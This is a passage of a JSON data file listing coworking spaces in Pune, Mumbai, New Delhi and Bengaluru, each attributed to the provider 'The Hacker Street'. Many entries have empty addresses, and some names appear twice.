            },
            {
                "name": "Fuel Spaces",
                "address": "Vishal Nagar, Pune",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "iKeva Powai",
                "address": "Powai, Mumbai",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "The Matchbox Coworking",
                "address": "Andheri West, Mumbai",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "TBL Space",
                "address": "Balewadi, Pune",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Redbrick – Shivajinagar",
                "address": "Shivajinagar, Pune",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Redbrick – Magarpatta",
                "address": "Magarpetta, Pune",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "2499 Office",
                "address": "Tagore Garden Extension, New Delhi",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Meraki Spaces",
                "address": "Shivajinagar, Pune",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Coherent co-working",
                "address": "Baner, Pune",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "The Mesh – Koregaon Park",
                "address": "Koregaon Park, Pune",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "The Space",
                "address": "Rachana Park, Pune",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "One Co.Work",
                "address": "Connaught Place, New Delhi",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Peer Share Coworking",
                "address": "Vasant Vihar, New Delhi",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Share-A-Space",
                "address": "Aundh, Pune",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Avanta Business Centre",
                "address": "Barakhamba, New Delhi",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Reno Spaces",
                "address": "Baner, Pune",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Starthub",
                "address": "Koregaon Park, Pune",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "InCube",
                "address": "Aundh, Pune",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "The Work Lab",
                "address": "Aundh, Pune",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "The Work Lab",
                "address": "Model Colony, Pune",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Workolab",
                "address": "Pusa Road, New Delhi",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Workly",
                "address": "Lajpat Nagar, New Delhi",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "myDesk",
                "address": "KG Marg, New Delhi",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "ABL Workspaces",
                "address": "Green Park Extension, New Delhi",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "22 Workspace",
                "address": "Asaf Ali Rd, New Delhi",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Maker’s Asylum",
                "address": "Malviya Nagar, New Delhi",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Startup Tunnel Coworking",
                "address": "Chattarpur, New Delhi",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Delhi Co",
                "address": "Shahpur Jat, New Delhi",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "So Share",
                "address": "Shahpur, New Delhi",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "1share office",
                "address": "East of Kailash, New Delh",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "NCR Urban Hive Spaces",
                "address": "Green Park Extension, New Delhi",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Hatch101",
                "address": "Badarpur, New Delhi",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Myinstapass Coworking",
                "address": "Hauz Khas, New Delhi",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "The Founders Café",
                "address": "Okhla Industrial Area, New Delhi",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Aboard Offices",
                "address": "Dwarka, New Delhi",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "eTribe Coworking",
                "address": "Mayur Vihar, New Delhi",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "CoworkIn Lajpat Nagar",
                "address": "",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "91 Springboard Nehru Place",
                "address": "Nehru Place, New Delhi",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Awfis Qutab Institutional Area A16",
                "address": "Qutab Institutional Area, New Delhi",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "GoHive",
                "address": "Ghitorni, New Delhi",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Greendesks",
                "address": "",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Stirring Minds",
                "address": "",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Empowerers Co-Working",
                "address": "Yusuf Sarai, New Delhi",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Innov8 Coworking CP",
                "address": "Connaught Place, New Delhi",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "ProWorkIn",
                "address": "Sant nagar, New Delhi",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "CoworkIn Nehru Place",
                "address": "Nehru Place, New Delhi",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "The Daftar",
                "address": "Baner Road, Pune",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "TRIOS Coworking",
                "address": "Balewadi, Pune",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "TRIOS Coworking",
                "address": "Viman Nagar, Pune",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "TRIOS Coworking",
                "address": "Baner, Pune",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "The Hub",
                "address": "Karve Rd, Mayur Colony, Pune",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Excella",
                "address": "Laxman Nagar, Baner, Pune",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Collabworks Carter Road",
                "address": "Carter Road, Bandra, Mumbai",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Collabworks",
                "address": "The Cuckoo Club, Bandra, Mumbai",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Ultimate Arena",
                "address": "Andheri, Mumbai",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Teal House",
                "address": "Andheri, Mumbai",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Innov8 Andheri",
                "address": "Boston House, Andheri, Mumbai",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Cohive Coworking",
                "address": "Karve Road, Pune",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Divine Coworking",
                "address": "Baner, Pune",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Cowork studio",
                "address": "Viman Nagar, Pune",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Bootstart – Varsha Park",
                "address": "Varsha Park, Pune",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Bootstart Koregaon Park",
                "address": "Koregaon Park, Pune",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Bootstart – Kalyani Nagar",
                "address": "Kalyani Nagar - Pune",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Bootstart – Baner RD",
                "address": "Baner Road, Pune",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Bootstart – Bavdhan",
                "address": "Bavdhan, Pune",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Smartworks – Yerwada",
                "address": "Yerwada - Pune",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Smartworks – Baner",
                "address": "Baner, Pune",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Smartworks – Baner ACTP",
                "address": "Baner ACTP, Pune",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Smartworks",
                "address": "Magarpatta City, Pune",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "The Empire Business Centre",
                "address": "Lower Parel, Mumbai",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Servcorp",
                "address": "Bandra Kurla Complex, Mumbai",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "DBS House Fort",
                "address": "Prescot Rd, fort, Mumbai",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "DBS Office",
                "address": "Andheri East, Mumbai",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "The Boardroom",
                "address": "Malad West, Mumbai",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Coworkyard Andheri",
                "address": "Andheri East, Mumbai",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Up in the Air",
                "address": "Dubash Marg, Ford, Mumbai",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Quest Offices",
                "address": "Bandra Kurla Complex, Mumbai",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Hustle Cowork",
                "address": "Anand Vihar, New Delhi",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "YesssWorks Palm Beach",
                "address": "Palm Beach RD, Navi Mumbai",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Spacewhiz Saint John Baptist",
                "address": "Bandra West, Mumbai",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "AccessWork Malad West",
                "address": "Malad West, Mumbai",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "AccessWork Powai",
                "address": "Powai, Mumbai",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Access Kalina BKC",
                "address": "Kalina BKC, Mumbai",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "YesssWorks BKC",
                "address": "Kurla West, Mumbai",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "603 Powai",
                "address": "Powai, Mumbai",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Access Vikhroli",
                "address": "Vikhroli, Mumbai",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "SOS Sakinaka",
                "address": "Andheri East, Sakinaka,Mumbai",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Co.Lab.Oratory asia",
                "address": "kurla Road, Mumbai",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Divine Hub",
                "address": "Andheri East, Mumbai",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Blue Mushroom",
                "address": "Malad West, Mumbai",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Clearspaces",
                "address": "Andheri East, Mumbai",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Regus",
                "address": "Goregaon East, Mumbai",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "G-Corp Media",
                "address": "Andheri East, Mumbai",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Tasmac Business Centre",
                "address": "Andheri West, Mumbai",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Beesquare",
                "address": "Thane Belapur Road, Mumbai",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Arth Coworking",
                "address": "Senapati Bapat Marg, Mumbai",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "OfficeSpace Lokhandwala",
                "address": "Off Link Road, Mumbai",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "ZoomStart India",
                "address": "",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "91springboard Navi Mumbai",
                "address": "",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "91springboard Lotus",
                "address": "",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "CfE Offices",
                "address": "",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Coworking Central Suburbs",
                "address": "",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "JITO Coworking",
                "address": "",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "The Millennial Pod",
                "address": "",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Workafella",
                "address": "",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Dhinchak Coworking",
                "address": "",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "MyKopcha",
                "address": "",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Office Space",
                "address": "",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "wegrow",
                "address": "",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Access Andheri East",
                "address": "",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Hour Space",
                "address": "",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Smartworks",
                "address": "",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Deodhar Workspace",
                "address": "",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Orbit Plaza",
                "address": "",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Redbrick powai",
                "address": "",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Redbrick BKC",
                "address": "",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Spacewhiz New Link Road",
                "address": "",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Spacewhiz JP Road",
                "address": "",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Connections Co-Working",
                "address": "",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Rise Co – Working",
                "address": "",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Cowrks Worli",
                "address": "",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Cowrks Powai",
                "address": "",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "The A Coworking",
                "address": "",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Evita",
                "address": "",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Garage Co-Working",
                "address": "",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Dextrus",
                "address": "",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Arch N Rock",
                "address": "",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Maker’s Asylum",
                "address": "",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "at101 Coworking",
                "address": "",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Kontor Space",
                "address": "",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Cowrks Worli",
                "address": "",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Cowrks Powai",
                "address": "",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "The A Coworking",
                "address": "",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Evita",
                "address": "",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Garage Co-Working",
                "address": "",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Dextrus",
                "address": "",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Arch N Rock",
                "address": "",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Maker’s Asylum",
                "address": "",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "at101 Coworking",
                "address": "",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Kontor Space",
                "address": "",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "WorkAmp 59",
                "address": "",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "WorkAmp Estate",
                "address": "",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Of10 Cowoking",
                "address": "",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Vorq Space Andheri",
                "address": "",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Vorq Space",
                "address": "",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Innov8 Vikhroli",
                "address": "",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Bluespace Coworking",
                "address": "",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "IShareSpace",
                "address": "",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Geekout",
                "address": "",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Harkat Studios",
                "address": "",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Ministry of New",
                "address": "",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Garage Coworking",
                "address": "",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "WeWork Vaswani Chambers",
                "address": "",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "WeWork Oberoi Commerz II",
                "address": "",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "WeWork Marol",
                "address": "",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "The Playce",
                "address": "",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Mascots Coworking",
                "address": "",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "91springboard BKC",
                "address": "",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "91springboard",
                "address": "",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Mosaic Coworking",
                "address": "",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "WorkLoft",
                "address": "",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Cowork Garage",
                "address": "HSR Layout, Bengaluru ",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Octavius Coworking",
                "address": "Kudlu Gate, Bengaluru",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Boutik Stay Coworking",
                "address": "Whitefield, Bengaluru",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Invertree Shared Offices",
                "address": "Sector 7, HSR Layout, Bengaluru",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Cowork@35/2",
                "address": "Cooke Town, Bengaluru",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Share Studio",
                "address": "Sadashivnagar, Bengaluru",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "InCubes Coworking",
                "address": "Brookefield, Bengaluru",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Sky Offices",
                "address": "Museum Road, Bengaluru",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Bangalore Alpha Lab",
                "address": "JP Nagar 2nd Phase, Bengaluru",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Bangalore Best",
                "address": "Langford Gardens, Bangalore",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Spacelance HSR",
                "address": "HSR Layout, Sector 1, Bengaluru",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "WorkPod",
                "address": "JP Nagar, Bengaluru",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "ClayWorks CBD",
                "address": "Ashok Nagar, Bengaluru",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "AKH Infomedia Solutions",
                "address": "Lingarajpuram, Bengaluru",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "The Bohemian House",
                "address": "Richmond Town, Bengaluru",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "DBS House",
                "address": "Cunningham Road, Bengaluru",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "NUMA Coworking",
                "address": "Ashok Nagar, Bengaluru",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Upstart Coworking",
                "address": "Whitefield, Brooke Bond First Cross, Bengaluru",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Workmatterz",
                "address": "HRBR Layout 1st Block, Bengaluru",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Quest Offices",
                "address": "MG Road, Bengaluru",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Next Space",
                "address": "HSR Layout, Bengaluru",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Evoma EPIP Zone",
                "address": "EPIP Zone Whitefield, Bengaluru",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Square one",
                "address": "Indiranagar, Bengaluru,",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Evoma KR Puram",
                "address": "K R Puram, Bengaluru",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Evoma Marathahalli",
                "address": "Marathahalli, Bengaluru",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Lorven Coworks",
                "address": "Jayanagar 4th Block, Bengaluru",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Classic Converge",
                "address": "5th Phase, JP Nagar, Bengaluru",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Co – start Hub Coworking",
                "address": "Sanjaynagar, Bengaluru",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Prime Coworking",
                "address": "koramangala, Bengaluru",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Bangalore Coworking Hub",
                "address": "Kodihalli, Bengaluru",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "WorkWise",
                "address": "",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Redbrick Offices",
                "address": "",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Awfis ORR",
                "address": "Kadubeesanahalli, Bengaluru",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Gospace Coworking",
                "address": "Whitefield, Bengaluru",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Happy Coworks",
                "address": "HSR Layout, Bengaluru",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Vybrant Coworks",
                "address": "BTM stage1, Bengaluru",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Bhive Workspace Koramangala",
                "address": "Koramangala 6th block, Bengaluru",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Bhive Workspace Residency Road",
                "address": "Richmond Town, Bengaluru",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Urban Vault Indiranagar",
                "address": "Kodihalli, Bengaluru",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Bhive Workspace Indiranagar",
                "address": "Indiranagar, Bengaluru",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Awfis Whitefield",
                "address": "Whitefield, Bengaluru",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "The Hive Coworking",
                "address": "ITPL Main Road, Bengaluru",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "iKeva Coworking",
                "address": "Marathahalli ORR, Bengaluru",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Cowrks  Koramangala",
                "address": "Koramangala, Bengaluru",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Inspire Jayanagar",
                "address": "Jayanagar 7th Block, Bengaluru",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Kokarya Business Synergy Centre",
                "address": "Jayanagara 9th Block, Bengaluru",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Trik Traffic Coworking",
                "address": "Domlur, Bengaluru",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "PRI Co working Hub",
                "address": "Jp Nagar, Bengaluru",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "V Converge",
                "address": "HSR Layout, Bengaluru",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Startupin",
                "address": "",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Gyan Space",
                "address": "Electronic City, Bengaluru",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "B Station",
                "address": "St Marks Road, Bengaluru",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Work ‘n’ Space",
                "address": "OMBR Layout, Bengaluru",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Gopalan Coworks Indiranagar",
                "address": "Nagavarapalya, Bengaluru",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Instasquares Business Center",
                "address": "Jayanagar, Bengaluru",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Sierra Cartel",
                "address": "Pulikeshi Nagar, Bengaluru",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Sierra Cartel HRBR",
                "address": "HRBR Layout, Bengaluru",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Sierra Cartel HSR",
                "address": "HSR layout, Bengaluru",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Starttopia Coworking",
                "address": "BTM Layout, Bengaluru",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Accilerator Marathahalli",
                "address": "Silver Springs Layout, Bengaluru",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "IKP Eden",
                "address": "Tavarekere Main Rd, Bengaluru",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Bootstart CoWorking",
                "address": "Raj Mahal Vilas 2nd Stage, Bengaluru",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "The Circular Square",
                "address": "Doddakalansandra, Bengaluru",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Unispace Business Center",
                "address": "Kudlu Gate, Bengaluru",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Intide Space",
                "address": "J.P.Nagar, Bengaluru",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "365 shared space Indiranagar",
                "address": "Indiranagar, Bengaluru",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Hustle hub Co-working",
                "address": "HSR Layout, Bengaluru",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Muse Hub Coworking",
                "address": "Marathahalli, Bengaluru",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Le BURROW coworking",
                "address": "Uttarahalli, Bengaluru",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "HOFIS Coworking",
                "address": "",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Cubic Business Centre",
                "address": "Koramangala 3 Block, Bengaluru",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Co start hub",
                "address": "Sanjaynagar, Bengaluru",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Davanam Golden Square Prime",
                "address": "Koramangala, Bengaluru",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "My WorkArea",
                "address": "Sheshadripuram, Bengaluru",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "365 shared spaces HSR",
                "address": "HSR Layout, Bengaluru",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Investopad",
                "address": "4th Block, Koramangala, Bengaluru",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "WeWork Galaxy",
                "address": "Ashok Nagar, Bengaluru",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Rainmakers Workspace",
                "address": "MG Road, Bengaluru",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Candor HUB",
                "address": "MG Road, Bengaluru",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "HOFIS Coworking",
                "address": "",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
